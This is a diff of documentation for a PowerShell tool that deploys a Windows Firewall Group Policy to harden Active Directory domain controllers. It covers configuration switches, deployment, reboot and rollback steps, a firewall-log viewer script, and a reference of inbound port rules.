-Indicates whether inbound Windows Server Update Services (WSUS) traffic should be allowed.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### EnableWDS
-
-Indicates whether inbound Windows Deployment Services (WDS) traffic should be allowed.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### EnableWebServer
-
-Indicates whether inbound http.sys-based web server traffic on default HTTP and HTTPS ports should be allowed.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### EnableFSRMManagement
-
-Indicates whether inbound File Server Resource Manager (FSRM) management traffic should be allowed.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### EnablePrintSpooler
-
-Indicates whether inbound Print Spooler traffic through RPC over TCP should be allowed.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### EnableNetworkProtection
-
-Indicates whether the [Network protection](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/network-protection?view=o365-worldwide#overview-of-network-protection) feature of Microsoft Defender Antivirus should be enabled.
-
-If `true` MDA Network Protection will be configured in block mode. If `false` MDA Network Protection will be configured in audit mode only. If `null` MDA Network Protection will not be configured.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: null
-Recommended value: true
-Possible values: true / false / null
-```
-
-### BlockWmiCommandExecution
-
-Indicates whether to block process creations originating from PSExec and WMI commands using Defender ASR. This is achieved by enforcing the following Microsoft Defender Antivirus Attack Surface Reduction (ASR) rules:
-
-- [Block process creations originating from PSExec and WMI commands](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-process-creations-originating-from-psexec-and-wmi-commands)
-- [Block persistence through WMI event subscription](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-persistence-through-wmi-event-subscription)
-
-If `true` MDA Attack Surface Reduction rules (mentioned above) will be configured in block mode. If `false` MDA Attack Surface Reduction rules (mentioned above) will be configured in audit mode only, allowing you to evaluate the possible impact if the rules were enabled in block mode. If `null` MDA ASR rules are not configured, effectively disabling the rules.
-
-> [!IMPORTANT]
-> System Center Configuration Manager (SCCM) agent will not work properly if these ASR rules are enabled.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: null
-Recommended value: true
-Possible values: true / false / null
-```
-
-### EnableRpcFilters
-
-Indicates whether additional [filtering of RPC over Named Pipes](#rpc-filters) should be applied.
-
-If `true`, RPC filters defined in `RpcNamedPipesFilters.txt` will be enabled. If `false`, RPC filters are not enabled. If `null` this setting is not managed.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: null
-Recommended value: true
-Possible values: true / false / null
-```
-
-### EnableLocalIPsecRules
-
-Indicates whether local IPSec rules should be enabled. Although no IPSec rules are deployed by this solution, most [security baselines](#security-standards-compliance) require local IPSec rules to be disabled.
-
-If `true`, local IPSec rules will be enabled. If `false`, only IPSec rules distributed through GPOs will be allowed.
-
-```yaml
-Type: Boolean
-Required: false
-Default value: true
-Recommended value: false
-Possible values: true / false
-```
-
-### CustomRuleFileNames
-
-Specifies the name(s) of additional script file(s) containing firewall rules that will be imported into the Group Policy Object (GPO).
-
-There are several practical advantages to keeping customer-specific firewall rules in separate files:
-
-- The main script file can easily be updated without the need to re-apply customer modifications.
-- Custom rule scripts can be shared among multiple server roles. As an example, rules enabling communication with a backup agent will probably be the same for domain controller (DC) and certification authority (CA).
-
-See the `CustomRules.Sample.ps1` sample file, which can be used as a template.
-
-```yaml
-Type: String[]
-Required: false
-Default value: null
-```
-
-## Deployment
-
-### Prerequisites
-
-![](../Images/Badges/windows-server.png) ![](../Images/Badges/windows-client.png)
-
-![](../Images/Badges/powershell5.png)
-
-- Domain Admins group membership or equivalent privileges, enabling the creation of a Group Policy Object (GPO), creation of folders and files in `SYSVOL`, and linking the GPO to the Domain Controllers OU.
-- PowerShell modules that must be installed as part of RSAT:
-  - [GroupPolicy](https://learn.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps)
-  - [ActiveDirectory](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)
-
-### Dealing with GPO Tattooing
-
-Some firewall-related settings are not removed from the domain controllers after they fall out of scope of the GPO. These changes are thus permanent and require manual removal. Such settings are called **unmanaged** and the resulting behavior is known as GPO tattooing. To address this issue, configuration files use ternary logic:
-
-- `true` ⇒ The setting is enabled by the GPO.
-- `false` ⇒ The setting is disabled by the GPO.
-- `null` ⇒ The local setting is not changed by the GPO.
-
-As a consequence, before the value of an unmanaged setting can be changed from `true` to `null`, it must temporarily be set to `false`.  Keep in mind that it may take time for the new settings to propagate to all domain controllers due to replication latency. Additionally, some settings may require a reboot.
-
-The following settings in this project are known to cause tattooing:
-
-- [NtdsStaticPort](#ntdsstaticport)
-- [NetlogonStaticPort](#netlogonstaticport)
-- [FrsStaticPort](#frsstaticport)
-- [DfsrStaticPort](#dfsrstaticport)
-- [WmiStaticPort](#wmistaticport)
-- [DisableNetbiosBroadcasts](#disablenetbiosbroadcasts)
-- [DisableMDNS](#disablemdns)
-- [EnableRpcFilters](#enablerpcfilters)
-
-### System Reboots
-
-Changes to some settings require a reboot of the target domain controller to get applied. This is the case of static port number configurations and settings that are modified through the startup script:
-
-- [NtdsStaticPort](#ntdsstaticport)
-- [NetlogonStaticPort](#netlogonstaticport)
-- [FrsStaticPort](#frsstaticport)
-- [DfsrStaticPort](#dfsrstaticport)
-- [WmiStaticPort](#wmistaticport)
-- [EnableRpcFilters](#enablerpcfilters)
-- [LogFilePath](#logfilepath)
-- [EnableNPS](#enablenps)
-
-If a full system reboot of all domain controllers is undesirable, the following steps can be performed instead:
-
-1. Make sure that the Group Policy changes are replicated to all domain controllers.
-2. Invoke the `gpupdate.exe` command for the changed policies to be applied immediately.
-3. Run the `gpscript.exe /startup` command for Group Policy startup scripts to be executed immediately.
-4. Execute the `net.exe stop NTDS && net.exe start NTDS` command to restart the AD DS Domain Controller service.
-5. Execute the `net.exe stop IAS && net.exe start IAS` command to restart the Network Policy Server service, if present.
-6. Execute the `net.exe stop NtFrs && net.exe start NtFrs` command to restart the File Replication service, if migration to DFS-R has not been performed yet.
-7. Repeat steps 2-6 on all domain controllers.
-
-### Installation
-
-Rename `Set-ADDSFirewallPolicy.Starter.json` to `Set-ADDSFirewallPolicy.json`.  
-Review the available configuration items with sample values in `Set-ADDSFirewallPolicy.Sample.json` and use any, that you want to be configured in your environment.  
-All the configuration items with their possible values are documented in the [Configuration](#configuration) chapter.
-
-Once you are finished with modifying all the required configuration settings in the `Set-ADDSFirewallPolicy.json` file, it is recommended to review the [set of rules](#inbound-firewall-rules-reference) that will be deployed by the GPO.  
-
-After the review is completed, you can begin with the deployment.
-
-Open Powershell and run the `Set-ADDSFirewallPolicy.ps1` script:
-
-![Executing the PowerShell script](../Images/Screenshots/deploy-install-script.png)
-
-You might need to adjust your Powershell execution policy to allow execution of the script:
-
-![Changing the Script Execution Policy](../Images/Screenshots/deploy-ps-exec-policy.png)
-
-> [!NOTE]
-> If you are using AppLocker, Device Guard or Constrained Language Mode, you might need adjust the configured restrictions in order to run the script.  
-
-Script logic:
-
-Creates GPO – the GPO is NOT linked to any OU.
-
-Atomic changes…
-
-Creates startup script `FirewallConfiguration.bat` (batch file is used to avoid any issues with Powershell execution policy)
-
-![Autogenerated Group Policy startup script](../Images/Screenshots/deploy-gpo-startup-script.png)
-
-If the script has finished without any errors, all required objects should be deployed.
-
-The last step is to link the newly created GPO to Domain Controllers OU.
-
-Before doing that, you should **thoroughly review** the GPO!  
-
-Once done, link the GPO to Domain Controllers OU.
-
-![Group Policy link](../Images/Screenshots/deploy-gpo-link.png)
-
-By default, GPO is refreshed every 5 minutes for DCs, so all your DCs should have the firewall configuration applied within maximum of 5 minutes.  
-Some settings require DC restart to apply, please refer to [System Reboots](#system-reboots).
-
-### Troubleshooting
-
-The following PowerShell script can be used to display the Windows Firewall log file in a human-readable way:
-
-```powershell
-[string] $logFilePath = "$env:SystemRoot\System32\LogFiles\Firewall\pfirewall.log"
-
-[string[]] $columnsToShow = @('date','time','path','action','pid',
-    'src-ip','src-port','dst-ip','dst-port','icmptype','icmpcode')
-
-Get-Content -Path $LogFilePath |
-    Select-Object -Skip 3 |
-    ForEach-Object { $PSItem -replace '^#Fields: ' } |
-    ConvertFrom-Csv -Delimiter ' ' |
-    Select-Object -Property $columnsToShow |
-    Out-GridView -Title 'Windows Firewall Log' -Wait
-```
-
-![Parsing firewall log files](../Images/Screenshots/firewall-log-parser.png){ width=400px }
-
-An improved version of this script is available in the `Show-WindowsFirewallLog.ps1` file, which is part of the `DCFWTool`.
-
-### Rollback
-
-As some of the settings are propagated throug startup script and some, even though propagated through GPO, cause tattooing, you first need to reconfigure some settings in the GPO and modify the startup script, let the changes apply on all DCs and only after that, unlink the GPO.
-
-Follow these steps:
-
-1. Change the following settings in the GPO:
-
-- [NtdsStaticPort](#ntdsstaticport)
-- [NetlogonStaticPort](#netlogonstaticport)
-- [FrsStaticPort](#frsstaticport)
-- [DisableNetbiosBroadcasts](#disablenetbiosbroadcasts)
-- [DisableMDNS](#disablemdns)
-
-[Locate](#administrative-templates) all the above settings in the Firewall GPO and set them to "Not Configured".
-
-![Rollback GPO Tattooing](../Images/Screenshots/rollback-gpo-tatto.png)
-
-2. Change the following settings in the startup script:
-
-- [DfsrStaticPort](#dfsrstaticport)
-- [WmiStaticPort](#wmistaticport)
-
-Locate and open `FirewallConfiguration.bat` file, located in the "Startup" folder of the DC firewall GPO (e.g.: `C:\Windows\Sysvol\domain\Policies\{03AAF463-967E-46DD-AB7F-DBD4ECC28F63}\Machine\Scripts\Startup`):
-
-> [!NOTE]
-> The GUID in the path is randomly generated and will be different in each environment. Also the path to `SYSVOL` might differ based on your DC configuration.
-
-Change the following line `winmgmt.exe /standalonehost 6` ⇒ `winmgmt /sharedhost`  
-Change the following line `dfsrdiag.exe StaticRPC /Port:5722` ⇒ `dfsrdiag staticrpc /port:0`
-
-![Rollback Startup Script](../Images/Screenshots/rollback-startup-script.png)
-
-3. Remove the RPC filters
-
-Remove "#" before "exit" at line 15 in `RpcNamedPipesFilters.txt`, located in the "Startup" folder of the DC firewall GPO (e.g.: `C:\Windows\Sysvol\domain\Policies\{03AAF463-967E-46DD-AB7F-DBD4ECC28F63}\Machine\Scripts\Startup`):
-
-> [!NOTE]
-> The GUID in the path is randomly generated and will be different in each environment. Also the path to `SYSVOL` might differ based on your DC configuration.
-
-![Rollback RPC Named Pipes](../Images/Screenshots/rollback-rpc-named-pipes.png)
-
-4. Restart the DCs
-
-Once AD and `SYSVOL` replication convergence is achieved and all DCs in the environment received the changed GPO, startup script and RPC configuration file, you need to restart all DCs.
-
-5. Unlink the GPO
-
-Once all DCs have been restarted, you unlink the Firewall GPO from the Domain Controllers container in GPO management console.
-
 ## Inbound Firewall Rules Reference
 
 ### Microsoft's Guidelines
 
+There are multiple official documents available that list the ports used by Windows Server and specifically Active Directory:
+
 - [How to configure a firewall for Active Directory domains and trusts](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/config-firewall-for-ad-domains-and-trusts)
 - [Service overview and network port requirements for Windows](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/service-overview-and-network-port-requirements)
 
-Dynamic RPC ports, listed in the table below, can be set to static port through [Configuration File](#configuration-file):
-
-- [NTDS static port](#ntdsstaticport)
-- [Netlogon static port](#netlogonstaticport)
-- [FRS static port](#frsstaticport)
-- [DFSR static port](#dfsr-static-port)
+The following table maps all the ports used by domain controllers to the corresponding Windows Firewall rules:
 
 |Port|Service|Rule Reference|
 |---|---|---|
@@ -2196,7 +2968,16 @@ Dynamic RPC ports, listed in the table below, can be set to static port through 
 |42/TCP|WINS|[Windows Internet Naming Service (WINS) (TCP-In)](#windows-internet-naming-service-wins-tcp-in)|
 |42/UDP|WINS|[Windows Internet Naming Service (WINS) (UDP-In)](#windows-internet-naming-service-wins-udp-in)|
 
-Additional firewall rules that are not DC-specific might be required to enable core networking functionality and server remote management:
+A handful of services that use dynamic RPC ports by default (see the table above)
+can be configured to use static ones through the [Configuration File](#configuration-file):
+
+- [NTDS](#ntdsstaticport)
+- [Netlogon](#netlogonstaticport)
+- [FRS](#frsstaticport)
+- [DFSR](#dfsr-static-port)
+
+Additional firewall rules that are not DC-specific might be required to enable core networking functionality
+and server remote management:
 
 |Port|Service|Rule Reference|
 |---|---|---|
@@ -2211,7 +2992,7 @@ Additional firewall rules that are not DC-specific might be required to enable c
 |5986/TCP|WinRM|[Windows Remote Management (HTTPS-In)](#windows-remote-management-https-in)|
 |49152-65535/TCP|WMI|[Windows Management Instrumentation (WMI-In)](#windows-management-instrumentation-wmi-in)|
 |3389/UDP|Remote Desktop|[Remote Desktop - User Mode (UDP-In)](#remote-desktop---user-mode-udp-in)|
-|3389/TCP|Remote Desktop|[Remote Desktop - User Mode (TCP-In)](#remote-desktop---user-mode-tcp-in),[Remote Desktop (TCP-In)](#remote-desktop-tcp-in)|
+|3389/TCP|Remote Desktop|[Remote Desktop - User Mode (TCP-In)](#remote-desktop---user-mode-tcp-in), [Remote Desktop (TCP-In)](#remote-desktop-tcp-in)|
 |22/TCP|SSH|[OpenSSH SSH Server (sshd)](#openssh-ssh-server-sshd)|
 |49152-65535/TCP|DFS Management|[DFS Management (TCP-In)](#dfs-management-tcp-in)|
 |49152-65535/TCP|DNS RPC|[RPC (TCP, Incoming)](#rpc-tcp-incoming)|
@@ -2242,7 +3023,9 @@ Additional firewall rules that are not DC-specific might be required to enable c
 | Description | Inbound rule for the Active Directory Domain Controller service to allow NTP traffic for the Windows Time service. [UDP 123] |
 | Remote Addresses | Any |
 
-As the NTP service might be used by non-Windows clients, we do not limit the remote addresses.
+> [!NOTE]
+> As the NTP service might be used by non-Windows clients,
+> we do not limit the remote addresses.
 
 #### Active Directory Domain Controller (RPC-EPMAP)
 
@@ -2384,7 +3167,8 @@ Two dynamic RPC ports are used by default, but the services can be [reconfigured
 | Description | Inbound rule to allow remote UDP access to the DNS service. |
 | Remote Addresses | Any |
 
-As the DNS service might be used by non-Windows clients, we do not limit the remote addresses.
+> [!NOTE]
+> As the DNS service might be used by non-Windows clients, we do not limit the remote addresses.
 
 #### DNS (TCP, Incoming)
 
@@ -2400,7 +3184,8 @@ As the DNS service might be used by non-Windows clients, we do not limit the rem
 | Description | Inbound rule to allow remote TCP access to the DNS service. |
 | Remote Addresses | Any |
 
-As the DNS service might be used by non-Windows clients, we do not limit the remote addresses.
+> [!NOTE]
+> As the DNS service might be used by non-Windows clients, we do not limit the remote addresses.
 
 #### Kerberos Key Distribution Center (TCP-In)
 
@@ -2441,7 +3226,9 @@ As the DNS service might be used by non-Windows clients, we do not limit the rem
 | Description | Inbound rule for the Active Directory Domain Controller service to be remotely managed over Named Pipes. [UDP 445] |
 | Remote Addresses | [Client Computers](#clientaddresses), [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-We are not sure if this rule is actually needed, as we have never seen UDP traffic on port 445. However, it is part of the predefined firewall rules on Windows Server and is mentioned in several official documents.
+> [!NOTE]
+> We are not sure if this rule is actually needed, as we have never seen UDP traffic on port 445.
+> However, it is part of the predefined firewall rules on Windows Server and is mentioned in several official documents.
 
 #### Active Directory Domain Controller - SAM/LSA (NP-TCP-In)
 
@@ -2634,7 +3421,8 @@ This rule is governed by the [EnableNetbiosSessionService](#enablenetbiossession
 | Description | Inbound rule for the Active Directory Web Services. [TCP] |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
- The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+ The scope of this rule can further be limited by enabling
+ the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### Windows Remote Management (HTTP-In)
 
@@ -2649,7 +3437,9 @@ This rule is governed by the [EnableNetbiosSessionService](#enablenetbiossession
 | Description | Inbound rule for Windows Remote Management via WS-Management. [TCP 5985] |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnableWindowsRemoteManagement](#enablewindowsremotemanagement) setting. The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This rule is governed by the [EnableWindowsRemoteManagement](#enablewindowsremotemanagement) setting.
+The scope of this rule can further be limited by enabling
+the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### Windows Remote Management (HTTPS-In)
 
@@ -2664,7 +3454,12 @@ This rule is governed by the [EnableWindowsRemoteManagement](#enablewindowsremot
 | Description | Inbound rule for Windows Remote Management via WS-Management. [TCP 5986] |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This custom rule is governed by the [EnableWindowsRemoteManagement](#enablewindowsremotemanagement) setting. The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This custom rule is governed by the [EnableWindowsRemoteManagement](#enablewindowsremotemanagement) setting.
+The scope of this rule can further be limited by enabling
+the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+
+> [!NOTE]
+> This is a custom firewall rule, as there is no built-in rule allowing traffic on port 5986/TCP.
 
 #### Windows Management Instrumentation (WMI-In)
 
@@ -2680,10 +3475,14 @@ This custom rule is governed by the [EnableWindowsRemoteManagement](#enablewindo
 | Description | Inbound rule to allow WMI traffic for remote Windows Management Instrumentation. [TCP] |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This protocol uses a dynamic RPC port by default, but it can be [reconfigured to use a static one](#wmistaticport). The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This protocol uses a dynamic RPC port by default, but it can be [reconfigured to use a static one](#wmistaticport).
+The scope of this rule can further be limited by enabling
+the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 > [!NOTE]
-> The WMI protocol also supports receiving asynchronous callbacks through the `%systemroot%\system32\wbem\unsecapp.exe` binary. This feature is rarely used and we are unaware of a practical use case for async clients running on domain controllers.
+> The WMI protocol also supports receiving asynchronous callbacks through
+> the `%systemroot%\system32\wbem\unsecapp.exe` binary. This feature is rarely used and we are unaware of a practical
+> use case for async clients running on domain controllers. The corresponding firewall rule is therefore omitted.
 
 #### Remote Desktop - User Mode (UDP-In)
 
@@ -2699,7 +3498,9 @@ This protocol uses a dynamic RPC port by default, but it can be [reconfigured to
 | Description | Inbound rule for the Remote Desktop service to allow RDP traffic. [UDP 3389] |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnableRemoteDesktop](#enableremotedesktop) setting. The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This rule is governed by the [EnableRemoteDesktop](#enableremotedesktop) setting.
+The scope of this rule can further be limited by enabling
+the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### Remote Desktop - User Mode (TCP-In)
 
@@ -2715,7 +3516,9 @@ This rule is governed by the [EnableRemoteDesktop](#enableremotedesktop) setting
 | Description | Inbound rule for the Remote Desktop service to allow RDP traffic. [TCP 3389] |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnableRemoteDesktop](#enableremotedesktop) setting. The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This rule is governed by the [EnableRemoteDesktop](#enableremotedesktop) setting.
+The scope of this rule can further be limited by enabling
+the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### Remote Desktop (TCP-In)
 
@@ -2731,9 +3534,13 @@ This rule is governed by the [EnableRemoteDesktop](#enableremotedesktop) setting
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
 > [!NOTE]
-> This legacy rule is created for backward compatibility with Windows Server 2008 R2 and earlier. It was superseded by the [Remote Desktop - User Mode (TCP-In)](#remote-desktop---user-mode-tcp-in) rule in Windows Server 2012.
+> This legacy rule is created for backward compatibility with Windows Server 2008 R2 and earlier.
+> It was superseded by the [Remote Desktop - User Mode (TCP-In)](#remote-desktop---user-mode-tcp-in) rule
+> in Windows Server 2012.
 
-This rule is governed by the [EnableRemoteDesktop](#enableremotedesktop) setting. The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This rule is governed by the [EnableRemoteDesktop](#enableremotedesktop) setting.
+The scope of this rule
+can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### DFS Management (TCP-In)
 
@@ -2748,7 +3555,8 @@ This rule is governed by the [EnableRemoteDesktop](#enableremotedesktop) setting
 | Description | Inbound rule for DFS Management to allow the DFS Management service to be remotely managed via DCOM. |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
- The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+ The scope of this rule can further be limited by enabling
+ the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### RPC (TCP, Incoming)
 
@@ -2764,7 +3572,8 @@ This rule is governed by the [EnableRemoteDesktop](#enableremotedesktop) setting
 | Description | Inbound rule to allow remote RPC/TCP access to the DNS service. |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
- The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+ The scope of this rule can further be limited by enabling
+ the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### Windows Backup (RPC)
 
@@ -2780,7 +3589,9 @@ This rule is governed by the [EnableRemoteDesktop](#enableremotedesktop) setting
 | Description | Inbound rule for the Windows Backup Service to be remotely managed via RPC/TCP |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnableBackuManagement](#enablebackupmanagement) setting. The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This rule is governed by the [EnableBackuManagement](#enablebackupmanagement) setting.
+The scope of this rule
+can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### Performance Logs and Alerts (TCP-In)
 
@@ -2795,7 +3606,9 @@ This rule is governed by the [EnableBackuManagement](#enablebackupmanagement) se
 | Description | Inbound rule for Performance Logs and Alerts traffic. [TCP-In] |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnablePerformanceLogAccess](#enableperformancelogaccess) setting. The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This rule is governed by the [EnablePerformanceLogAccess](#enableperformancelogaccess) setting.
+The scope of this rule
+can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### COM+ Remote Administration (DCOM-In)
 
@@ -2811,7 +3624,9 @@ This rule is governed by the [EnablePerformanceLogAccess](#enableperformanceloga
 | Description | Inbound rule to allow DCOM traffic to the COM+ System Application for remote administration. |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnableComPlusManagement](#enablecomplusmanagement) setting. The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This rule is governed by the [EnableComPlusManagement](#enablecomplusmanagement) setting.
+The scope of this rule can
+further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### Remote Event Log Management (RPC)
 
@@ -2827,7 +3642,9 @@ This rule is governed by the [EnableComPlusManagement](#enablecomplusmanagement)
 | Description | Inbound rule for the local Event Log service to be remotely managed via RPC/TCP. |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnableEventLogManagement](#enableeventlogmanagement) setting.  The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This rule is governed by the [EnableEventLogManagement](#enableeventlogmanagement) setting.
+The scope of this rule
+can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### Remote Scheduled Tasks Management (RPC)
 
@@ -2843,7 +3660,9 @@ This rule is governed by the [EnableEventLogManagement](#enableeventlogmanagemen
 | Description | Inbound rule for the Task Scheduler service to be remotely managed via RPC/TCP. |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnableScheduledTaskManagement](#enablescheduledtaskmanagement) setting. The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This rule is governed by the [EnableScheduledTaskManagement](#enablescheduledtaskmanagement) setting.
+The scope of this rule
+can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### Remote Service Management (RPC)
 
@@ -2858,7 +3677,9 @@ This rule is governed by the [EnableScheduledTaskManagement](#enablescheduledtas
 | Description | Inbound rule for the local Service Control Manager to be remotely managed via RPC/TCP. |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnableServiceManagement](#enableservicemanagement) setting. The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This rule is governed by the [EnableServiceManagement](#enableservicemanagement) setting.
+The scope of this rule
+can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### Remote Volume Management - Virtual Disk Service (RPC)
 
@@ -2874,7 +3695,9 @@ This rule is governed by the [EnableServiceManagement](#enableservicemanagement)
 | Description | Inbound rule for the Remote Volume Management - Virtual Disk Service to be remotely managed via RPC/TCP. |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnableDiskManagement](#enablediskmanagement) setting. The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This rule is governed by the [EnableDiskManagement](#enablediskmanagement) setting.
+The scope of this rule
+can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### Remote Volume Management - Virtual Disk Service Loader (RPC)
 
@@ -2889,7 +3712,9 @@ This rule is governed by the [EnableDiskManagement](#enablediskmanagement) setti
 | Description | Inbound rule for the Remote Volume Management - Virtual Disk Service Loader to be remotely managed via RPC/TCP. |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnableDiskManagement](#enablediskmanagement) setting. The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This rule is governed by the [EnableDiskManagement](#enablediskmanagement) setting.
+The scope of this rule
+can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### Windows Defender Firewall Remote Management (RPC)
 
@@ -2905,7 +3730,9 @@ This rule is governed by the [EnableDiskManagement](#enablediskmanagement) setti
 | Description | Inbound rule for the Windows Defender Firewall to be remotely managed via RPC/TCP. |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnableFirewallManagement](#enablefirewallmanagement) setting. The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This rule is governed by the [EnableFirewallManagement](#enablefirewallmanagement) setting.
+The scope of this rule
+can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 ### Replication Traffic
 
@@ -2945,17 +3772,20 @@ This protocol uses a dynamic RPC port by default, but it can be [reconfigured to
 
 #### Server Role Co-Location
 
-As a security best-practice, it is recommended not to deploy additional server roles on domain controller servers. Unfortunately, real-world environments do not always follow this recommendation and domain controllers often serve as branch office DHCP and RADIUS servers as well. This chapter therefore contains a list of optional firewall rules that can be enabled to support such scenarios.
+As a security best-practice, it is recommended not to deploy additional server roles on domain controller servers.
+Unfortunately, real-world environments do not always follow this recommendation and domain controllers
+often serve as branch office DHCP and RADIUS servers as well. This chapter therefore contains a list of optional
+firewall rules that can be enabled to support such scenarios.
 
 For now, the following Windows Server roles and features are covered:
 
 - [Windows Internet Naming Service (WINS)](#windows-internet-naming-service-wins-tcp-in)
 - [Dynamic Host Configuration Protocol (DHCP) Server](#dhcp-server-v4-udp-in)
 - [Network Policy Server (NPS)](#network-policy-server-legacy-radius-authentication---udp-in)
-- [Web Server (IIS)](#world-wide-web-services-http-traffic-in)
-- [Windows Deployment Services (WDS)](#windows-deployment-services-rpc-in)
+- [Web Server (IIS)](#world-wide-web-services-http-traffic-in) (highly discouraged)
